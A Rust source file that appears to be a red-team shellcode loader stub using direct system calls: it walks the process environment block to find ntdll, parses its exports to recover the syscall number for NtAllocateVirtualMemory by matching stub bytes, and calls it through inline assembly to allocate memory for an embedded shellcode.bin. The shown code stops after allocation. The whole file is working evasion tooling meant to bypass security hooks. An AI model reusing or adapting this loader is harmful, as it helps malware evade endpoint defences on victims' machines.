use std::{arch::global_asm, ffi::CStr, os::raw::c_void, ptr::null_mut};

use ntapi::{ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PTEB};
use windows_sys::Win32::System::{
    Diagnostics::Debug::IMAGE_NT_HEADERS64,
    Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE},
    SystemServices::{
        IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_SIGNATURE,
    },
};

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");

global_asm!(
    "
    .section .data
    SSN: .word 0

    .section .text

    Sys_NtAllocateVirtualMemory:
        mov r10, rcx
        mov rax, [rip + SSN]
        syscall
        ret
    "
);

unsafe extern "system" {
    fn Sys_NtAllocateVirtualMemory(
        ProcessHandle: *mut c_void,
        BaseAddress: *mut *mut c_void,
        ZeroBits: usize,
        RegionSize: *mut usize,
        AllocationType: u32,
        Protect: u32,
    ) -> i32;
}

unsafe extern "C" {
    static mut SSN: u32;
}

fn get_current_teb() -> PTEB {
    let mut teb: PTEB = null_mut();
    unsafe {
        #[cfg(target_arch = "x86_64")]
        std::arch::asm!(
            "mov {}, gs:[0x30]",
            out(reg) teb
        );
        #[cfg(target_arch = "x86")]
        std::arch::asm!(
            "mov {}, fs:[0x18]",
            out(reg) teb
        );
        teb
    }
}

fn get_ssn(funcname: &str) -> u32 {
    let mut ssn: u32 = 0;
    unsafe {
        let teb = get_current_teb();
        let peb = (*teb).ProcessEnvironmentBlock;

        if teb.is_null() || peb.is_null() || (*peb).OSMajorVersion != 10 {
            println!("[-] Invalid PEB.");
            return ssn;
        }

        let ldr_data_entry = ((*(*(*peb).Ldr).InMemoryOrderModuleList.Flink).Flink as *const u8)
            .offset(-0x10) as *const LDR_DATA_TABLE_ENTRY;

        let ntdll_base = (*ldr_data_entry).DllBase;
        println!("[+] ntdll.dll base address: {:p}", ntdll_base);

        let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;
        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            println!("[-] Invalid DOS header.");
            return ssn;
        }

        let nt_headers = (ntdll_base as *const u8).add((*dos_header).e_lfanew as usize)
            as *const IMAGE_NT_HEADERS64;

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            println!("[-] Invalid NT header.");
            return ssn;
        }

        let export_directory = (ntdll_base as *const u8)
            .add((*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize)
            as *const IMAGE_EXPORT_DIRECTORY;

        let address_of_functions = (ntdll_base as *const u8)
            .add((*export_directory).AddressOfFunctions as usize)
            as *const u32;
        let address_of_names = (ntdll_base as *const u8)
            .add((*export_directory).AddressOfNames as usize)
            as *const u32;
        let address_of_name_ordinals = (ntdll_base as *const u8)
            .add((*export_directory).AddressOfNameOrdinals as usize)
            as *const u16;

        for i in 0..(*export_directory).NumberOfNames as isize {
            let f_name =
                (ntdll_base as *const u8).add(*address_of_names.offset(i) as usize) as *const i8;

            let ordinal = *address_of_name_ordinals.offset(i) as usize;

            if ordinal >= (*export_directory).NumberOfFunctions as usize {
                continue;
            }

            let func_rva = *address_of_functions.offset(ordinal as isize);
            let func_addr = (ntdll_base as *const u8).add(func_rva as usize) as *const i8;

            let c_str = CStr::from_ptr(f_name);

            if let Ok(func_name) = c_str.to_str() {
                if funcname.eq_ignore_ascii_case(func_name) {
                    println!(
                        "[+] Found function: {} at address: {:p}",
                        funcname, func_addr
                    );

                    for i in 0..32 {
                        let bytes = func_addr as *const u8;

                        if *bytes.offset(i) == 0x4c
                            && *bytes.offset(i + 1) == 0x8b
                            && *bytes.offset(i + 2) == 0xd1
                            && *bytes.offset(i + 3) == 0xb8
                            && *bytes.offset(i + 6) == 0x00
                            && *bytes.offset(i + 7) == 0x00
                        {
                            let low = *bytes.offset(i + 4) as u32;
                            let high = *bytes.offset(i + 5) as u32;
                            ssn = (high << 8) | low;
                            println!("[+] Found SSN: {:#x}", ssn);
                            return ssn;
                        }
                    }
                }
            }
        }
    }

    ssn
}

fn main() {
    let mut size = SHELLCODE.len();
    let mut base_address: *mut c_void = std::ptr::null_mut();
    let ssn = get_ssn("NtAllocateVirtualMemory");
    println!("[+] SSN for NtAllocateVirtualMemory: {:#x}", ssn);
    unsafe {
        SSN = ssn;
    }

    let status = unsafe {
        Sys_NtAllocateVirtualMemory(
            -1isize as *mut c_void,
            &mut base_address,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if status != 0 {
        eprintln!("NtAllocateVirtualMemory failed with status: {:#x}", status);
        return;
    }

    println!("[+] Allocated {} bytes at => {:p}", size, base_address);
}
